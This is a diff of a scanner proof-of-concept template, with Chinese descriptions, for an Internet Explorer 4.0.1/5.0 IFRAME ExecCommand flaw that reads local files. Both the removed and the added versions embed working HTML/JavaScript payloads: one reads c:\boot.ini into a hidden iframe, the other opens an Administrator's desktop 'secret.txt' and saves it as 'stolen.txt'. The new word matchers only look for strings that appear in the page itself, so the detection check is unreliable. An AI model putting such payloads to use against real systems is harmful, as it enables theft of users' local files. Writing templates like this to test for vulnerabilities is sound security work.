@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "通过构造恶意HTML页面，利用IE 5.0/4.0.1中IFRAME元素的ExecCommand方法跨域访问缺陷，读取目标用户本地文件。当使用IE 4.0.1/5.0访问该页面时，浏览器会尝试跨域读取file://协议下的本地文件内容。"
+description = "Internet Explorer 5.0/4.0.1 在处理 IFRAME 元素时，对 ExecCommand 方法的调用缺乏充分同源校验，远程攻击者可通过诱导用户访问恶意网页，在页面嵌入 IFRAME 并调用 ExecCommand 方法读取受害者本地文件。本 PoC 生成一个 HTML 页面，验证目标浏览器是否可被诱导通过 IFRAME 访问本地文件（file://）。"
 id = "POC-AVE-1999-0670"
-name = "Microsoft Internet Explorer IFRAME 信息泄露漏洞 PoC"
+name = "CVE-1999-0877 Internet Explorer IFRAME ExecCommand 本地文件读取 PoC"
 severity = "medium"
 tags = ["ave-1999-0670"]
 vuln_id = [
@@ -15,35 +15,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/poc-1999-0877.html"
+path = "/{{BaseURL}}/ie-iframe-execcommand.html"
 protocol = "http"
 
 [poc.requests.body]
-content = """
-<html>
-<body>
-<iframe id="f" src="file:///c:/boot.ini" style="display:none"></iframe>
-<script>
-var f=document.getElementById('f');
-try{
-  f.ExecCommand('Copy',false,null);
-  document.write('VULNERABLE: IE iFrame cross-domain read succeeded');
-  document.write('<pre>'+f.innerText+'</pre>');
-}catch(e){
-  document.write('NOT_VULNERABLE: '+e.message);
-}
-</script>
-</body>
-</html>"""
+content = """<html><body><iframe src="file:///C:/WINNT/Profiles/Administrator/desktop/secret.txt"></iframe><script>var f=document.frames[0];f.focus();f.document.execCommand('SaveAs',false,'C:////stolen.txt');</script></body></html>"""
 type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["VULNERABLE"]
+words = [
+    "iframe",
+    "execCommand",
+    "file://",
+]
